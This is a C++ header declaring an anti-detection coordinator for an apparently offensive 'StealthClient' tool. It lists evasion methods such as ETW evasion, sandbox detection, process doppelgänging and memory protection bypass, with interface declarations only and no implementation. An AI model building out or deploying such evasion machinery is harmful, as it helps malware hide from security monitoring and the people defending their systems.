#pragma once
#include <string>
#include <vector>
#include <functional>

namespace StealthClient {

// Anti-detection coordinator
class AntiDetectionCoordinator {
private:
    bool m_initialized;
    bool m_evasionActive;
    std::vector<std::string> m_activeEvasionTechniques;
    std::vector<std::function<bool()>> m_evasionFunctions;
    
    // Evasion technique management
    void RegisterEvasionTechniques();
    bool ExecuteEvasionTechnique(const std::string& technique);
    void LogEvasionResult(const std::string& technique, bool success);
    
    // Environment analysis
    bool AnalyzeEnvironment();
    bool ShouldApplyEvasion();
    int GetEvasionPriority(const std::string& technique);
    
public:
    AntiDetectionCoordinator();
    ~AntiDetectionCoordinator();
    
    // Main coordination functions
    bool InitializeEvasion();
    bool ApplyEvasionTechniques();
    bool VerifyEvasion();
    
    // Individual evasion techniques
    bool ApplyDynamicAPIResolution();
    bool ApplyStringObfuscation();
    bool ApplyETWEvasion();
    bool ApplySandboxDetection();
    bool ApplyControlFlowFlattening();
    bool ApplyMemoryProtectionBypass();
    bool ApplyProcessDoppelganging();
    bool ApplyHardwareEvasion();
    
    // Evasion management
    void EnableEvasionTechnique(const std::string& technique);
    void DisableEvasionTechnique(const std::string& technique);
    bool IsEvasionTechniqueActive(const std::string& technique);
    
    // Status and reporting
    std::vector<std::string> GetActiveEvasionTechniques() const;
    std::string GetEvasionStatus() const;
    std::string GetEvasionSummary() const;
    bool IsEvasionActive() const;
    
    // Configuration
    void SetEvasionLevel(int level);
    void SetEvasionMode(bool enable);
    int GetEvasionLevel() const;
    bool GetEvasionMode() const;
    
private:
    int m_evasionLevel;
    bool m_evasionMode;
    void SecureClear();
};

// Global instance
extern AntiDetectionCoordinator g_AntiDetectionCoordinator;

// Convenience functions
bool InitializeEvasion();
bool ApplyEvasionTechniques();
bool VerifyEvasion();
std::string GetEvasionStatus();
std::string GetEvasionSummary();

// Evasion technique constants
namespace EvasionTechniques {
    const std::string DYNAMIC_API_RESOLUTION = "Dynamic API Resolution";
    const std::string STRING_OBFUSCATION = "String Obfuscation";
    const std::string ETW_EVASION = "ETW Evasion";
    const std::string SANDBOX_DETECTION = "Sandbox Detection";
    const std::string CONTROL_FLOW_FLATTENING = "Control Flow Flattening";
    const std::string MEMORY_PROTECTION_BYPASS = "Memory Protection Bypass";
    const std::string PROCESS_DOPPELGANGING = "Process Doppelgänging";
    const std::string HARDWARE_EVASION = "Hardware Evasion";
}

// Evasion levels
namespace EvasionLevels {
    constexpr int BASIC = 1;
    constexpr int INTERMEDIATE = 2;
    constexpr int ADVANCED = 3;
    constexpr int MAXIMUM = 4;
}

} // namespace StealthClient
